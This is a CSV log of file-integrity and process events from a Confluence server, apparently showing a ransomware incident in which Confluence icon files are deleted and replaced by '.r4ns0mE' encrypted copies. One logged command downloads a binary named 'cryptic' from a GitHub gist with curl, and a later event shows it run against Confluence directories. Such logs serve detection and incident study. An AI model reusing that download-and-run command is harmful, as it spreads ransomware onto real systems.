"@timestamp","host.hostname","event.action","event.module","file.owner","file.path","file.size","file.type","process.args"
"Oct 26, 2022 @ 01:34:36.168",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/pagetreesearch.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.162",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/pagetreesearch.r4ns0mE",913,file,"-"
"Oct 26, 2022 @ 01:34:36.160",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/column.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.156",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/column.r4ns0mE",422,file,"-"
"Oct 26, 2022 @ 01:34:36.153",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/livesearch.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.150",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/livesearch.r4ns0mE",834,file,"-"
"Oct 26, 2022 @ 01:34:36.149",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/details.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.146",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/details.r4ns0mE",768,file,"-"
"Oct 26, 2022 @ 01:34:36.145",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/section.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.142",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/section.r4ns0mE",478,file,"-"
"Oct 26, 2022 @ 01:34:36.140",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/profile.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.137",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/profile.r4ns0mE",714,file,"-"
"Oct 26, 2022 @ 01:34:36.135",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/change-history.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.132",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/change-history.r4ns0mE",862,file,"-"
"Oct 26, 2022 @ 01:34:36.126",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/space-details.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.123",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/space-details.r4ns0mE",751,file,"-"
"Oct 26, 2022 @ 01:34:36.122",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contentbylabel.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.114",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contentbylabel.r4ns0mE",731,file,"-"
"Oct 26, 2022 @ 01:34:36.111",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/macro-placeholder-default.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.109",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/pagetree.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.109",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/macro-placeholder-default.r4ns0mE",493,file,"-"
"Oct 26, 2022 @ 01:34:36.091",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/popular-labels.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.091",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/pagetree.r4ns0mE",555,file,"-"
"Oct 26, 2022 @ 01:34:36.081",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/popular-labels.r4ns0mE","1,154",file,"-"
"Oct 26, 2022 @ 01:34:36.077",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contributors-summary.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.075",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contributors-summary.r4ns0mE","1,172",file,"-"
"Oct 26, 2022 @ 01:34:36.054",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dynamictasklist.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.045",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dynamictasklist.r4ns0mE",627,file,"-"
"Oct 26, 2022 @ 01:34:36.043",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/bookmarks.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.039",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/bookmarks.r4ns0mE",727,file,"-"
"Oct 26, 2022 @ 01:34:36.037",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/favpages.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.034",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/favpages.r4ns0mE","1,437",file,"-"
"Oct 26, 2022 @ 01:34:36.015",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/widgetconnector.png","-","-","-"
"Oct 26, 2022 @ 01:34:36.009",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/widgetconnector.r4ns0mE",619,file,"-"
"Oct 26, 2022 @ 01:34:35.975",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/panel.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.972",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/panel.r4ns0mE",893,file,"-"
"Oct 26, 2022 @ 01:34:35.968",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/related-labels.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.964",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/related-labels.r4ns0mE",687,file,"-"
"Oct 26, 2022 @ 01:34:35.960",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/spaces.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.957",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/spaces.r4ns0mE","1,206",file,"-"
"Oct 26, 2022 @ 01:34:35.955",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/code.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.952",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/code.r4ns0mE",788,file,"-"
"Oct 26, 2022 @ 01:34:35.951",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/excerpt.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.948",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/excerpt.r4ns0mE",504,file,"-"
"Oct 26, 2022 @ 01:34:35.946",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/status.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.943",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/status.r4ns0mE",497,file,"-"
"Oct 26, 2022 @ 01:34:35.941",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/colour.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.938",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/colour.r4ns0mE","1,050",file,"-"
"Oct 26, 2022 @ 01:34:35.936",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/content-report-table.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.932",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/content-report-table.r4ns0mE",973,file,"-"
"Oct 26, 2022 @ 01:34:35.930",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/macro-default.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.926",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/macro-default.r4ns0mE",725,file,"-"
"Oct 26, 2022 @ 01:34:35.924",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/listlabels.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.920",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/listlabels.r4ns0mE",648,file,"-"
"Oct 26, 2022 @ 01:34:35.918",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/navmap.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.913",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/navmap.r4ns0mE",681,file,"-"
"Oct 26, 2022 @ 01:34:35.911",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/viewpdf.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.902",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/viewpdf.r4ns0mE","2,581",file,"-"
"Oct 26, 2022 @ 01:34:35.900",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/jira.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.895",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/jira.r4ns0mE",912,file,"-"
"Oct 26, 2022 @ 01:34:35.893",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/viewppt.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.890",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/viewppt.r4ns0mE","5,646",file,"-"
"Oct 26, 2022 @ 01:34:35.889",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/noformat.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.886",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/noformat.r4ns0mE",762,file,"-"
"Oct 26, 2022 @ 01:34:35.884",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contributors.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.881",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/contributors.r4ns0mE","1,426",file,"-"
"Oct 26, 2022 @ 01:34:35.880",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/children.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.876",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/children.r4ns0mE",556,file,"-"
"Oct 26, 2022 @ 01:34:35.874",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/jiraissues.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.872",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/jiraissues.r4ns0mE",912,file,"-"
"Oct 26, 2022 @ 01:34:35.855",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/detailssummary.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.852",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/detailssummary.r4ns0mE",669,file,"-"
"Oct 26, 2022 @ 01:34:35.850",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/anchor.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.848",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/anchor.r4ns0mE",746,file,"-"
"Oct 26, 2022 @ 01:34:35.800",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/toc.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.797",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/toc.r4ns0mE",453,file,"-"
"Oct 26, 2022 @ 01:34:35.795",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/multimedia.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.792",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/multimedia.r4ns0mE",673,file,"-"
"Oct 26, 2022 @ 01:34:35.791",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/chart.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.783",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/chart.r4ns0mE",411,file,"-"
"Oct 26, 2022 @ 01:34:35.781",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/rssfeed.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.777",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/rssfeed.r4ns0mE",803,file,"-"
"Oct 26, 2022 @ 01:34:35.775",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/network.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.772",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/network.r4ns0mE","1,228",file,"-"
"Oct 26, 2022 @ 01:34:35.770",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/expand.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.769",confluence,"process_started",system,"-","-","-","-","./cryptic, /var/atlassian/application-data/confluence, /opt/atlassian/confluence, /opt/atlassian/confluence/confluence, /opt/atlassian/confluence/confluence/WEB-INF/classes/com/atlassian/confluence"
"Oct 26, 2022 @ 01:34:35.769",confluence,"process_started",system,"-","-","-","-","./cryptic, /var/atlassian/application-data/confluence, /opt/atlassian/confluence, /opt/atlassian/confluence/confluence, /opt/atlassian/confluence/confluence/WEB-INF/classes/com/atlassian/confluence"
"Oct 26, 2022 @ 01:34:35.769",confluence,"process_stopped",system,"-","-","-","-","curl, -L, https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic"
"Oct 26, 2022 @ 01:34:35.767",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/expand.r4ns0mE",491,file,"-"
"Oct 26, 2022 @ 01:34:35.765",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/cheese.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.762",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/cheese.r4ns0mE","1,151",file,"-"
"Oct 26, 2022 @ 01:34:35.761",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/include.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.758",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/include.r4ns0mE",566,file,"-"
"Oct 26, 2022 @ 01:34:35.756",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/excerpt-include.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.753",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/excerpt-include.r4ns0mE",584,file,"-"
"Oct 26, 2022 @ 01:34:35.751",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/gallery.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.748",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/gallery.r4ns0mE",709,file,"-"
"Oct 26, 2022 @ 01:34:35.746",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/html.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.743",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/html.r4ns0mE",587,file,"-"
"Oct 26, 2022 @ 01:34:35.741",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/search.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.740",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/search.r4ns0mE",528,file,"-"
"Oct 26, 2022 @ 01:34:35.735",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/content-by-user.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.728",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/content-by-user.r4ns0mE",650,file,"-"
"Oct 26, 2022 @ 01:34:35.725",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/quote.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.709",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/quote.r4ns0mE",583,file,"-"
"Oct 26, 2022 @ 01:34:35.707",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/pagetreesearch.png","-","-","-"
"Oct 26, 2022 @ 01:34:35.704",confluence,created,"file_integrity",root,"/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/pagetreesearch.r4ns0mE",794,file,"-"
"Oct 26, 2022 @ 01:34:35.703",confluence,deleted,"file_integrity","-","/opt/atlassian/confluence/confluence/images/icons/macrobrowser/dropdown/column.png","-","-","-"
